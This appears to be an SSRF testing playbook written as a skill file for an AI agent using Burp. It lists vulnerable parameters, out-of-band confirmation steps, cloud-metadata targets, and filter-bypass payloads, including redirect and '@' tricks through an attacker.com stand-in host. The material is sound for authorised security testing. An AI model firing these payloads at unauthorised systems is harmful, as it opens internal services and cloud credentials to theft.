---
name: ssrf
description: Server-side request forgery testing. Use when an endpoint fetches a URL (image proxy, link preview, webhook, PDF generator, RSS/import), or when a redirect/`url` param is followed server-side.
---

# SSRF

Goal: make the server issue a request to an attacker-controlled address and prove it
(usually via Collaborator DNS/HTTP hit or a response containing internal data).

## Detect
Find features that take a URL/domain as input:
- image proxy: `?url=`, `?img=`, `/fetch?target=`, `?src=`
- link preview / unfurl / meta-scraper
- webhook / callback / integration URL fields
- PDF/thumbnail generator (`?url=`, `?path=`)
- import/RSS/feed sync, "download file" helpers
- `?redirect=` / `?next=` / `?return=` followed server-side (open redirect→SSRF)

## Confirm OOB (the clean way)
1. `burp_generate_collaborator_payload` → get `xxx.oastify.com`.
2. Send it in the URL field: `https://xxx.oastify.com`.
3. Poll `get_collaborator_interactions` — a DNS or HTTP hit to YOUR host = the server
   fetched it. Capture the interaction as evidence.

## Internal probing
After OOB confirmation, test internal targets (careful, low volume — never scan big ranges):
- `http://127.0.0.1/`, `http://localhost/`, `http://[::1]/`, `http://0.0.0.0/`
- Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), 
  `http://metadata.google.internal/` (GCP)
- Internal hostnames seen in JS/config, `http://10.0.0.1/`, `http://172.16.0.1/`
Observe the response body/status for proof.

## Bypass rotations (filter on localhost/private IP)
- **Decimal/hex/octal IPs:** `2130706433` (127.0.0.1), `0x7f000001`, `0177.0.0.1`
- **Alternate hosts:** `localhost`, `127.1`, `127.0.0.0`, `[::1]`, `0`, `127.0.0.1.nip.io`
- **Redirect tricks:** `http://attacker.com/redirect?to=http://127.0.0.1/` (server follows)
- **Encoding:** `%31%32%37`, unicode, IPv6 forms, trailing dot `127.0.0.1.`
- **Parsing confusion:** `@` (`http://127.0.0.1@attacker.com` — host is attacker), 
  `#`/`?` truncation, `\` instead of `/`
- **Protocol variants:** `gopher://`, `file://`, `dict://` if applicable

## Ruled out?
Require: OOB collaborator test + internal IP (127.0.0.1) response test + one bypass variant.

## Evidence
Capture the request with the collaborator payload and the interaction log (DNS/HTTP hit
with timestamp). For internal access, capture the response containing internal data.
Never paste real cloud metadata tokens into notes — describe it and reference the raw
response file.